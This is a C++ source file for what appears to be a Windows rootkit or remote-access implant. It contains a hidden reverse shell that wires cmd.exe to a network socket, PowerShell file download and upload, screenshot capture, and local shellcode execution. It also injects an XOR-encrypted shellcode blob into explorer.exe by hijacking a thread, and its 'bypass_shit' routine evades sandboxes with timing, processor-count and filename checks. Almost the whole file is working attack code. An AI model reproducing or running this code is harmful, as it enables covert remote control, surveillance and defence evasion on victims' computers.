#include "RootKit.h"
//void exec2(char* buffer, char *fileexec)
//{
//	if (32 >= (int)(ShellExecute(NULL, "open", fileexec, NULL, NULL, SW_HIDE)))
//	{
//		strcat(buffer, "[x] Error executing buffer..\n");
//	}
//	else
//	{
//		strcat(buffer, "\n");
//	}
//}
BOOL IsWow64(HANDLE process)
{
	BOOL bIsWow64 = FALSE;

	typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(process, &bIsWow64))
		{
			//handle error
		}
	}
	return bIsWow64;
}

bool IsX86Process(HANDLE process)
{
	SYSTEM_INFO systemInfo = {0};
	GetNativeSystemInfo(&systemInfo);

	// x86 environment
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return true;

	// Check if the process is an x86 process that is running on x64 environment.
	// IsWow64 returns true if the process is an x86 process
	return IsWow64(process);
}

string getProcesses()
{
	string s;
	WTS_PROCESS_INFO *pWPIs = NULL;
	DWORD dwProcCount = 0;
	if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
	{
		SYSTEM_INFO lpInfo = {0};
		GetNativeSystemInfo(&lpInfo);
		lpInfo.wProcessorArchitecture;
		//Go through all processes retrieved
		for (DWORD i = 0; i < dwProcCount; i++)
		{
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
											  PROCESS_VM_READ,
										  FALSE, pWPIs[i].ProcessId);
			s.append(pWPIs[i].pProcessName).append("\t").append(to_string(pWPIs[i].ProcessId)).append("\t");
			if (IsX86Process(hProcess))
				s.append("32bit\n");
			else
				s.append("64bit\n");
		}
	}

	return s;
	//Free memory
	if (pWPIs)
	{
		WTSFreeMemory(pWPIs);
		pWPIs = NULL;
	}
}

void random_str(char *s, const int len)
{
	srand(time(NULL));
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i)
	{
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

void split(char *command, char splitted[2][100])
{
	memset(splitted, 0, sizeof(splitted[0][0]) * 100 * 2);
	int j = 0;
	for (char *i = command; *i != ' '; i++)
	{
		splitted[0][j] = *i;
		j++;
	}
	int k = 0;
	for (char *i = command + j + 1; *i != '\0'; i++)
	{
		splitted[1][k] = *i;
		k++;
	}
}

void inplace_reverse(char *str)
{
	if (str)
	{
		char *end = str + strlen(str) - 1;

		// swap the values in the two given variables
		// XXX: fails when a and b refer to same memory location
#define XOR_SWAP(a, b) \
	do                 \
	{                  \
		a ^= b;        \
		b ^= a;        \
		a ^= b;        \
	} while (0)

		// walk inwards from both ends of the string,
		// swapping until we get to the middle
		while (str < end)
		{
			XOR_SWAP(*str, *end);
			str++;
			end--;
		}
#undef XOR_SWAP
	}
}

void getFileFromURL(char *url, char *filename)
{
	memset(filename, 0, sizeof(filename));
	int j = 0;
	for (char *i = &url[strlen(url) - 1]; *i != '/'; i--)
	{
		filename[j] = *i;
		j++;
	}
	inplace_reverse(filename);
	strcat(filename, " 2>&1");
}

std::string exec(const char *cmd)
{
	char buffer[128];
	std::string result = "";
	FILE *pipe = _popen(cmd, "r");
	try
	{
		while (fgets(buffer, sizeof buffer, pipe) != NULL)
		{
			result += buffer;
		}
	}
	catch (exception e)
	{
		result += e.what();
		_pclose(pipe);
	}
	_pclose(pipe);
	return result;
}

void uploadUrl(char *filename, char *buffer)
{
	//memset(buffer, 0, sizeof(buffer));
	FILE *pipe = _popen(strcat(strcat("powershell.exe invoke-webrequest -method put ", filename), " 2>&1"), "r");
	fread(buffer, sizeof(char), sizeof(char) * sizeof(buffer), pipe);
	_pclose(pipe);
}

void downloadUrl(char *url, char *buffer)
{
	char filename[30];
	getFileFromURL(url, filename);
	strcat(url, ",");
	FILE *pipe = _popen(strcat(strcat("powershell.exe $client = New-object System.Net.WebClient; $client.DownloadFile(", url), filename), "r");
	fread(buffer, sizeof(char), sizeof(char) * sizeof(buffer), pipe);
	_pclose(pipe);
}

void whoami(char *buffer)
{
	DWORD buflen = 257;
	GetUserNameA(buffer, &buflen);
	strcat(buffer, "\n");
}

void hostname(char *buffer)
{
	DWORD buflen = 257;
	GetComputerNameA(buffer, &buflen);
	strcat(buffer, "\n");
}

void pwd(char *buffer)
{
	CHAR tempvar[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, tempvar);
	strcat(buffer, tempvar);
	strcat(buffer, "\n");
}

void RevShell(const char *host, const char *port)
{
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(host, port, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}

//
//void RevShell() old reverse shell
//{
//	WSADATA wsaver;
//	WSAStartup(MAKEWORD(2, 2), &wsaver);
//	SOCKET tcpsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//	sockaddr_in addr;
//	addr.sin_family = AF_INET;
//	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
//	addr.sin_port = htons(4444);
//	if (connect(tcpsocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
//		closesocket(tcpsocket);
//		WSACleanup();
//		exit(0);
//	}
//	else
//	{
//		char recieved[BUFLEN] = "";
//		char buf_to_be_sent[1257] = "";
//		char splitted[10][100];
//		while (true)
//		{
//			int result = recv(tcpsocket, recieved, BUFLEN, 0);
//			char *src, *dst;
//			for (src = dst = recieved; *src != '\0'; src++) {
//				*dst = *src;
//				if (*dst != '\n' && *dst != '\r') dst++;
//			}
//			*dst = '\0';
//			split(recieved, splitted);
//			if (strcmp(recieved, "whoami") == 0)
//			{
//				whoami(buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(recieved, "pwd") == 0)
//			{
//				pwd(buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(recieved, "hostname") == 0)
//			{
//				hostname(buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(recieved, "exit") == 0)
//			{
//				closesocket(tcpsocket);
//				WSACleanup();
//				exit(0);
//			}
//			else if (strcmp(splitted[0], "download") == 0)
//			{
//				downloadUrl(splitted[1], buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else if (strcmp(splitted[0], "upload") == 0)
//			{
//				uploadUrl(splitted[1], buf_to_be_sent);
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			else
//			{
//				strcpy(buf_to_be_sent, exec(recieved).c_str());
//				send(tcpsocket, buf_to_be_sent, strlen(buf_to_be_sent) + 1, 0);
//			}
//			memset(buf_to_be_sent, 0, sizeof(buf_to_be_sent));
//			memset(recieved, 0, sizeof(recieved));
//		}
//
//	}
//	closesocket(tcpsocket);
//	WSACleanup();
//	exit(0);
//}

void screenshot(string file)
{
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

	HDC dc = GetDC(GetDesktopWindow()); //get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	//copy context

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(), &rc0kno); // get desktop size;
	int w = rc0kno.right - rc0kno.left;			//width
	int h = rc0kno.bottom - rc0kno.top;			//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h); //create bitmap
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY); //copy pixel from pulpit to bitmap
	Bitmap *bm = new Bitmap(hbitmap, NULL);

	UINT num;
	UINT size;

	ImageCodecInfo *imagecodecinfo;
	GetImageEncodersSize(&num, &size); //get count of codec

	imagecodecinfo = (ImageCodecInfo *)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo); //get codec

	CLSID clsidEncoder;

	for (int i = 0; i < num; i++)
	{
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid; //get jpeg codec id
	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(), file.end()); //sring to wstring
	bm->Save(ws.c_str(), &clsidEncoder); //save in jpeg format
	SelectObject(dc2, holdbitmap);		 //Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(), dc);
	GdiplusShutdown(gdiplustoken);
}

void FreeScreenshot(char *data)
{
	GlobalFree((HGLOBAL)data);
}

char *CaptureScreenshot()
{
	HDC hdcScr, hdcMem;

	HBITMAP hBitmap;
	BITMAP bmp;

	int xRes, yRes;

	hdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
	hdcMem = CreateCompatibleDC(hdcScr);

	xRes = GetDeviceCaps(hdcScr, HORZRES);
	yRes = GetDeviceCaps(hdcScr, VERTRES);

	hBitmap = CreateCompatibleBitmap(hdcScr, xRes, yRes);

	if (hBitmap == 0)
		return NULL;

	if (!SelectObject(hdcMem, hBitmap))
		return NULL;

	if (!StretchBlt(hdcMem, 0, 0, xRes, yRes, hdcScr, 0, 0, xRes, yRes, SRCCOPY))
		return NULL;

	PBITMAPINFO pbmi;
	WORD cClrBits;

	if (!GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&bmp))
		return NULL;

	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);

	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else
		cClrBits = 32;

	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8 * pbmi->bmiHeader.biHeight * cClrBits;

	pbmi->bmiHeader.biClrImportant = 0;

	BITMAPFILEHEADER hdr;
	PBITMAPINFOHEADER pbih;

	DWORD dwTotal;
	DWORD cb;
	char *lpBits;
	char *hp;

	DWORD dwTmp;

	pbih = (PBITMAPINFOHEADER)pbmi;
	lpBits = (char *)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits)
		return NULL;

	if (!GetDIBits(hdcMem, hBitmap, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS))
	{
		GlobalFree(lpBits);
		return NULL;
	}

	hdr.bfType = 0x4d42;

	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);

	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;

	hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);

	cb = pbih->biSizeImage;

	DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD);
	dwSize += cb;

	char *image = (char *)GlobalAlloc(GMEM_FIXED, dwSize);
	memcpy_s(image, dwSize, &hdr, sizeof(BITMAPFILEHEADER));
	memcpy_s(image + sizeof(BITMAPFILEHEADER), dwSize - sizeof(BITMAPFILEHEADER), pbih, sizeof(BITMAPINFOHEADER));
	memcpy_s(image + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), dwSize - sizeof(BITMAPFILEHEADER) - sizeof(BITMAPINFOHEADER), lpBits, cb);

	GlobalFree((HGLOBAL)lpBits);

	ReleaseDC(0, hdcScr);
	ReleaseDC(0, hdcMem);

	return image;
}

static inline bool is_base64(unsigned char c)
{
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_decode(std::string const &encoded_string)
{

	static const std::string base64_chars =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789+/";
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_]))
	{
		char_array_4[i++] = encoded_string[in_];
		in_++;
		if (i == 4)
		{
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i)
	{
		for (j = 0; j < i; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);

		for (j = 0; (j < i - 1); j++)
			ret += char_array_3[j];
	}

	return ret;
}

void injectFPT(const char *payload)
{
	void *exec = VirtualAlloc(0, sizeof payload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, payload, sizeof payload);
	((void (*)())exec)();
}

void injectCT(const char *payload)
{
	LPVOID lpvAddr; // address of the test memory
	HANDLE hHand;
	DWORD dwWaitResult;
	DWORD threadID;
	lpvAddr = VirtualAlloc(0, strlen(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(lpvAddr, payload, strlen(payload));
	hHand = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, 0, 0, &threadID);
	dwWaitResult = WaitForSingleObject(hHand, INFINITE);
}

void pid_inject(int pid, const char *shellcode)
{
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
}

void inject_explorer()
{
	char oHTCgmULsfT[]="\x9b\x36\xea\x1f\xac\x89\xe8\xc0\xf9\xbd\x95\x0a\xd4\xab\xeb\x05\xcd\x90\xba\x1a\x48\xf3\xaf\x97\xf9\xa6\x9d\xff\x4b\xad\x21\x30\x27\xa6\xdd\x81\xc1\x81\x99\x62\x43\xfb\x63\x6f\x27\x5e\x3b\x9b\x7d\x0b\x65\xe6\x8c\x48\x8f\xda\xd9\xa5\x11\xe7\x64\x30\xc8\xe2\xb7\x79\x76\xb5\x6e\x94\x99\x57\x8d\x17\x34\x81\x63\x79\x77\x29\x32\x32\x65\xcc\x67\x2d\xee\x0b\x5a\x28\xa0\xf2\x99\x67\x39\x49\x57\x39\x97\x0a\xb8\xc7\xd3\xe1\x3c\x53\xca\xc3\xe2\xde\x29\x67\xc9\xd9\x61\x2d\xa0\x6e\x8c\xf3\x66\x9a\x9b\x26\x51\xb5\x76\x05\xb9\x57\x4a\xaf\x3c\x3a\x87\x78\x9a\xeb\xf8\x3b\x66\x3d\x7a\x01\x93\xd0\xe4\x7e\x18\x09\x75\xdc\xf5\xfb\xbb\xfd\x29\x4c\xd6\xff\x9e\xbb\x96\xc7\xb1\xbe\xaa\x5e\xad\x46\xa2\xbd\xfa\xa6\x05\x10\xcb\x18\xc6\x90\x6e\xfd\xfd\x1b\x59\x22\x88\x92\x6b\x0c\xd8\x27\xa0\x1c\x35\x72\xc4\x43\x07\x1e\xdc\x34\x1e\x69\x59\xf5\x46\x07\xa6\xf8\x78\x98\x81\x96\xa6\x15\xdf\x53\xb3\xcb\xe2\xe7\x69\x95\xfb\xf8\x02\xd2\x51\x6d\x80\xac\x57\x84\xc4\x99\xee\x5f\x24\xb6\xac\x16\x60\x07\xff\x94\xf6\x23\xca\x01\xa8\x65\xe2\xa7\xba\xa2\x9f\xfb\x1a\x6b\x7b\x73\xbc\x89\x9b\x7a\xd7\x91\x86\x74\xa7\x64\xf1\x2a\x56\xa4\x8b\xd4\x67\x25\x1f\x24\xbe\xaf\x1c\xa5\xb9\xb2\x51\x22\x13\xf9\x3e\x05\x03\xaa\xa0\x2e\x43\xd3\x61\x68\x85\x59\x2f\xb0\xc0\x93\x43\x09\x62\x2f\x26\xfc\x64\x30\x51\x4d\x89\xbb\x9e\xa1\xa0\x08\x23\xca\xf2\x14\x1e\xff\x22\x3c\x27\xbb\x52\xb0\xb8\xfe\x70\x65\x56\x84\xa1\x08\x1e\xa6\xe6\x36\xaa\xf9\xb2\xdd\x31\x1f\xb8\x56\x31\xe5\x6b\xd9\x26\x48\x4c\xd8\x6b\x6a\x40\xe3\xb6\xf0\x6f\x57\x34\x0f\x53\xb9\x4a\xe2\x64\x73\x4e\x3d\x30\xdb\x28\xcd\x6d\xa5\xd0\xc6\x91\x47\xa5\xb3\x42\x11\x62\x00\x80\xa3\xa6\xd1\x4f\x28\x07\xc7\xa9\x8c\x30\xa3\xb3\xf6\x9c\xcf\xeb\x49\x26\xc9\xc1\x85\xd8\x7a\xee\x8e\x21\x72\x86\x29\xad\x39\xb8\x07\xd6\x82\x5d\xa4\x46\x81\x18\x20\x8b\xb5\x05\xe3\x65\x92\xc0\x86\x16\xed\x53\xe5\xeb\x3a\x6d\xee\x88\x77\x31\xc0\xfe\xe6\x01\x54\xfb\x09\xb7\x57\xb0\x2e\xbf\x7a\x65\x65\x5b\x2d\x50\x55\xf1\x50\xe3\x59\x9a\xb9\x2b\xcc\xad\x18\x3b\xaf\xcb\xe9\xae\xdf\x84\xe9\x03\xbf\x88\x01\x36\x99\xd0\x6e\x1e\xc9\xa3\xd6\x34\xf4\x8f";
char XrzLJgruaKR[]="\x67\x7e\x69\xfb\x5c\x61\x24\xc0\xf9\xbd\xd4\x5b\x95\xfb\xb9\x54\x9b\xd8\x8b\xc8\x2d\xbb\x24\xc5\x99\xee\x16\xad\x53\xe5\xaa\x62\x07\xee\xd2\x36\x8b\xcb\xd1\xe9\x31\xab\x2e\x5e\xee\x16\x0a\x5b\xd1\x37\x04\x9a\x8e\x64\xaf\x9b\x18\x6c\x1c\xa6\x65\xf1\x2a\x0f\xe5\x31\xfd\xe7\x4e\x1f\xdb\x6b\xc5\x16\xe4\xe7\xe2\x01\x6f\x22\x30\x73\x34\xc3\xe2\x5f\xee\x0b\x5a\xa3\x20\x7a\x99\x67\x39\x01\xd2\xf9\xe3\x6d\xf0\xc6\x03\xb1\x78\xd8\x8a\xe3\xab\xdf\xf9\xec\x81\xc1\x82\x7b\xed\x5f\x45\xbb\x99\x53\xda\xad\x65\x3d\x3e\x04\x6f\x1f\x7b\x6f\x7d\xfb\x4e\x75\x36\xaa\xf9\xfa\x5e\xdd\x0f\xf0\xdf\xd3\xa8\x5a\x10\x4c\x4c\x0d\x80\x23\xe3\xb9\xa2\x0c\xf2\xb6\x9f\x6b\xf0\x86\x3a\xb2\xe2\x1a\x26\x06\xbe\xf4\xfb\x76\x44\x9b\xcf\x90\x87\xc8\x2f\xa5\xa3\x42\x11\x23\x58\xc8\x2a\x54\x99\x7e\xe1\x46\x7d\xf1\x28\x63\x46\x4c\x23\xd4\x46\x28\x00\xaf\x0e\x8c\xb4\x11\x33";
    char mQVTJMhMtQ[sizeof oHTCgmULsfT];
    int oKItBEhkz = 0;
    for (int AyWYVssreAaa = 0; AyWYVssreAaa < sizeof oHTCgmULsfT; AyWYVssreAaa++)
    {
        if (oKItBEhkz == sizeof XrzLJgruaKR - 1)
            oKItBEhkz = 0;
        mQVTJMhMtQ[AyWYVssreAaa] = oHTCgmULsfT[AyWYVssreAaa] ^ XrzLJgruaKR[oKItBEhkz];
        oKItBEhkz++;
    }
	PROCESSENTRY32 eiBgcJoaMZ;
    eiBgcJoaMZ.dwSize = sizeof(PROCESSENTRY32);
    HANDLE MEdZmOQBXKvg = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(MEdZmOQBXKvg, &eiBgcJoaMZ) == TRUE)
    {
        while (Process32Next(MEdZmOQBXKvg, &eiBgcJoaMZ) == TRUE)
        {
            if (stricmp(eiBgcJoaMZ.szExeFile, "explorer.exe") == 0)
            {
                HANDLE PxzbppMRw;
                PVOID CdJhrETL;
                HANDLE huoNaLVVA = NULL;
                HANDLE njHZmmXaWjYs;
                THREADENTRY32 tGEkSnwdz;
                CONTEXT ZQHhvoof;
                ZQHhvoof.ContextFlags = CONTEXT_FULL;
                tGEkSnwdz.dwSize = sizeof(THREADENTRY32);
                PxzbppMRw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, eiBgcJoaMZ.th32ProcessID);
                CdJhrETL = VirtualAllocEx(PxzbppMRw, NULL, sizeof mQVTJMhMtQ, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(PxzbppMRw, CdJhrETL, mQVTJMhMtQ, sizeof mQVTJMhMtQ, NULL);
                njHZmmXaWjYs = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                Thread32First(njHZmmXaWjYs, &tGEkSnwdz);
                while (Thread32Next(njHZmmXaWjYs, &tGEkSnwdz))
                {
                    if (tGEkSnwdz.th32OwnerProcessID == eiBgcJoaMZ.th32ProcessID)
                    {
                        huoNaLVVA = OpenThread(THREAD_ALL_ACCESS, FALSE, tGEkSnwdz.th32ThreadID);
                        break;
                    }
                }
                SuspendThread(huoNaLVVA);
                GetThreadContext(huoNaLVVA, &ZQHhvoof);
                ZQHhvoof.Rip = (DWORD_PTR)CdJhrETL;
                SetThreadContext(huoNaLVVA, &ZQHhvoof);
                ResumeThread(huoNaLVVA);
            }
        }
    }
    CloseHandle(MEdZmOQBXKvg);
	printf("INJECTED!");
}

void bypass_shit()
{
	LPVOID lUcvwQVzr = NULL;
    lUcvwQVzr = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    if (lUcvwQVzr != NULL)
    {
        printf("STAGE1\n");
    }
    else
    {
        exit(0);
    }

    signed long long int eQQCclwxothB = 16249281915;
    signed long long int QKzjnGmJQAkp = 0;
    signed long long int cNBPNBbiZmVU = 0;
		printf("STAGE2\n");

    for (cNBPNBbiZmVU = 0; cNBPNBbiZmVU < eQQCclwxothB; cNBPNBbiZmVU++)
    {
        QKzjnGmJQAkp++;
    }
    if (QKzjnGmJQAkp != eQQCclwxothB)
    {
        exit(0);
    }

    SYSTEM_INFO myFCITsOm;
    GetSystemInfo(&myFCITsOm);
    int JhYvPzuiTdFT = myFCITsOm.dwNumberOfProcessors;
    if (JhYvPzuiTdFT < 2)
    {
        exit(0);
    }
		printf(__argv[0]);

     if (strstr(__argv[0], "demo.exe") > 0)
    {
        int i = 0;
    }
    else
    {
        exit(0);
    } 

    char *LNvyLNUv = NULL;
    LNvyLNUv = (char *)malloc(178915453);
    if (LNvyLNUv != NULL)
    {
        memset(LNvyLNUv, 00, 178915453);
    }
    int aeEWvOSOC = GetTickCount();
		printf("STAGE3\n");
    Sleep(53274);
    int dwTghlDqtX = GetTickCount();
    if ((dwTghlDqtX - aeEWvOSOC) < 53274)
    {
        exit(0);
    }
    free(LNvyLNUv);
    int wPOGooTJxKH = GetTickCount();
    Sleep(10000);
	printf("STAGE4\n");
    int jBkEAeFfel = GetTickCount();
    if ((jBkEAeFfel - wPOGooTJxKH) < 10000)
    {
        exit(0);
    }
	printf("DONE!!");
}